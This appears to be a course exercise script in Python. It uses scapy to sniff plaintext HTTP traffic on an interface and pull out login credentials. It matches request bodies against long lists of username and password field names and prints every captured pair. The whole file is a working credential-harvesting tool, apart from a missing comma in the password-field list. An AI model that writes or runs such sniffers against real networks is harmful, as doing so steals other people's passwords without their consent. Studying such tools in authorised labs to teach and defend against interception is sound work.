import os
from urllib import parse
import re

#
#   set display variable, unset in terminal, to avoid warning and errors
#
display = os.environ.get("DISPLAY")
if display:
    print(f"DISPLAY={display}")
    from scapy.all import *
    # import scapy.all as scapy
else:
    print("DISPLAY not set, setting to ':0.0'...")
    os.environ["DISPLAY"] = ":0.0"
    # import scapy.all as scapy
    from scapy.all import *

iface = "eth0"


def get_login_pass(body):
    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        if login in body:
            # print(f"[+] {login}")
            pass
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
            # print(f"[:] {user}")

    for passfield in passfields:
        if passfield in body:
            # print(f"[+] {passfield}")
            pass
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()
            # print(f"[:] {passwd}")

    if user and passwd:
        return user, passwd
    else:
        #
        #   this is implicit, and that's why it works
        #   despite the teacher error
        #
        return None


def pkt_parser(packet):
    # print(".", end=None)
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        # print(f"[+] packet has all the layers")
        # print(packet.summary())
        # print("+", end="")

        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)

        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        # print(f"[-] packet missing layers")
        # print("-", end="")
        pass


try:
    print(f"Start sniff on {iface}")
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
